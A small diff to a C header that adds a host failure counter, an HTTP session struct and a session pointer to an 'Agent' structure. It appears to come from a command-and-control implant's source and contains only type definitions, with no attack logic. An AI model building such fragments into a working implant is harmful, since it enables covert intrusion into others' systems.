@@ -32,6 +32,7 @@ typedef struct _HostData {
 	LPWSTR Host;
 	INT Port;
 	BOOL Alive;
+	INT NumFailures;
 	struct _HostData* Next;
 } HostData, * pHostData;
 
@@ -62,6 +63,10 @@ typedef struct _AgentConfig {
 	ListenerConfig listenerConfig;
 
 } AgentConfig, *PAgentConfig;
+
+typedef struct _HttpSession {
+	BOOL Active;
+} HttpSession, *pHttpSession;
 
 //TODO clean up this structure.
 //I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
@@ -113,6 +118,9 @@ typedef struct _Agent {
 
 	//current context info
 	PContextInfo Context;
+
+	//Session Info
+	pHttpSession session;
 
 
 	P_INT_TEB pTeb;
